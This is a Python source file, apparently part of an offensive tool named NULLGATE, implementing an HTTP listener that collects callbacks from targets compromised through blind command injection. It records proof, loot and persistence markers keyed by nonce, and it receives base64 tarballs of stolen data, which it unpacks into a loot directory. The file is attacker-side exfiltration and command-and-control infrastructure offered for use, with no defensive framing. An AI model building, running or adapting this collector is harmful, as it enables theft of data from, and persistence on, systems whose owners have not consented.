#!/usr/bin/env python3
"""Out-of-band callback collector.

This is the honesty mechanism. The injection endpoint is blind -- HTTP 200
does not mean the command ran. NULLGATE only marks a stage as executed when
the target itself calls back to this listener with the matching nonce.

Accepts:
  GET  /cb?n=<nonce>&m=proof|loot|persist   stage confirmation
  POST /cb?n=<nonce>&k=data                 base64 tarball of loot
"""

from __future__ import annotations

import base64
import os
import tarfile
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlsplit


class Collector:
    def __init__(self, host="0.0.0.0", port=8844, loot="/root/loot/nullgate"):
        self.host = host
        self.port = int(port)
        self.loot = loot
        self.events = []
        self.lock = threading.Lock()
        self.server = None
        self.thread = None
        self.error = ""

    def start(self):
        outer = self

        class Handler(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.0"

            def log_message(self, *args):
                pass

            def _reply(self, code=200, body=b"ok"):
                self.send_response(code)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Content-Type", "text/plain")
                self.end_headers()
                try:
                    self.wfile.write(body)
                except Exception:
                    pass

            def do_GET(self):
                q = parse_qs(urlsplit(self.path).query)
                nonce = (q.get("n") or [""])[0]
                marker = (q.get("m") or [""])[0]
                with outer.lock:
                    outer.events.append({"nonce": nonce, "kind": marker or "get",
                                         "data": ""})
                self._reply()

            def do_POST(self):
                length = int(self.headers.get("Content-Length") or 0)
                raw = self.rfile.read(length) if length else b""
                q = parse_qs(urlsplit(self.path).query)
                nonce = (q.get("n") or [""])[0]
                key = (q.get("k") or ["data"])[0]
                text = raw.decode("utf-8", "replace").strip()
                with outer.lock:
                    outer.events.append({"nonce": nonce, "kind": key,
                                         "data": text})
                if key == "data" and text:
                    outer._save_loot(nonce, text)
                self._reply()

        try:
            self.server = ThreadingHTTPServer((self.host, self.port), Handler)
        except Exception as exc:  # noqa: BLE001
            self.error = str(exc)
            return False
        self.thread = threading.Thread(target=self.server.serve_forever,
                                       daemon=True)
        self.thread.start()
        return True

    def _save_loot(self, nonce, b64data):
        """Decode and unpack the base64 tarball the target posted back."""
        try:
            data = base64.b64decode(b64data)
        except Exception:
            return None
        outdir = os.path.join(self.loot, "dump_%s" % nonce[:12])
        try:
            os.makedirs(outdir, exist_ok=True)
            import io
            with tarfile.open(fileobj=io.BytesIO(data), mode="r:gz") as tf:
                try:
                    tf.extractall(outdir, filter="data")
                except TypeError:  # Python < 3.12 has no tarfile filter
                    tf.extractall(outdir)
            return outdir
        except Exception:
            # Still keep the raw blob so nothing is silently lost.
            try:
                with open(os.path.join(self.loot, "dump_%s.tgz" % nonce[:12]),
                          "wb") as fh:
                    fh.write(data)
            except Exception:
                pass
            return None

    def seen(self, nonce, kind=None):
        with self.lock:
            for ev in self.events:
                if ev["nonce"] != nonce:
                    continue
                if kind is None or ev["kind"] in (kind, "get"):
                    return True
        return False

    def take_loot(self, nonce):
        with self.lock:
            for ev in self.events:
                if ev["nonce"] == nonce and ev["kind"] == "data" and ev["data"]:
                    return ev["data"]
        return ""

    def stop(self):
        if self.server:
            try:
                self.server.shutdown()
                self.server.server_close()
            except Exception:
                pass
            self.server = None
        self.thread = None
